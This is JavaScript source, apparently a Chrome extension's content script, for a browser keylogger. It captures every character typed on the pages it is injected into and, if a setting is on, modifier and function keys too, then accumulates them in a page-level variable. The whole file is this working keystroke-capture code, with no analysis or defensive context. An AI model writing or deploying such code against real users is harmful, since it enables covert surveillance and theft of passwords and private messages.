try{
    if (!document.title) {
        document.title = document.URL;
    }
    /* Keylib */
    // Alphanumeric
    document.addEventListener('keypress', function (e) {
        e = e || window.event;
        var charCode = typeof e.which == "number" ? e.which : e.keyCode;
        if (charCode) {
            log(String.fromCharCode(charCode));
        }
    });
    // Other keys
    chrome.storage.sync.get({allKeys: false}, function(settings) {
        if (settings.allKeys) {
            document.addEventListener('keydown', function (e) {
                e = e || window.event;
                var charCode = typeof e.which == "number" ? e.which : e.keyCode;
                if (charCode == 8) {
                    log("[BKSP]");
                } else if (charCode == 9) {
                    log("[TAB]");
                } else if (charCode == 13) {
                    log("[ENTER]");
                } else if (charCode == 16) {
                    log("[SHIFT]");
                } else if (charCode == 17) {
                    log("[CTRL]");
                } else if (charCode == 18) {
                    log("[ALT]");
                } else if (charCode == 91) {
                    log("[L WINDOW]"); // command for mac
                } else if (charCode == 92) {
                    log("[R WINDOW]"); // command for mac
                } else if (charCode == 93) {
                    log("[SELECT/CMD]"); // command for mac
                }
            });
        } else { // Non function keys
            document.addEventListener('keydown', function (e) {
                e = e || window.event;
                var charCode = typeof e.which == "number" ? e.which : e.keyCode;
                if (charCode == 8) {
                    log("[BKSP]");
                } else if (charCode == 9) {
                    log("[TAB]");
                } else if (charCode == 13) {
                    log("[ENTER]");
                }
            });
        }
    });
    /* Keylog Saving */
    var time = new Date().getTime();
    var shouldSave = false;
    var lastLog = time;
    // Key'ed on JS timestamp
    function log(input) {
        var now = new Date().getTime();
        if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
        lastLog = now;
        window.keylogger_text += input;
    }
}catch(e){
    console.log(e);
}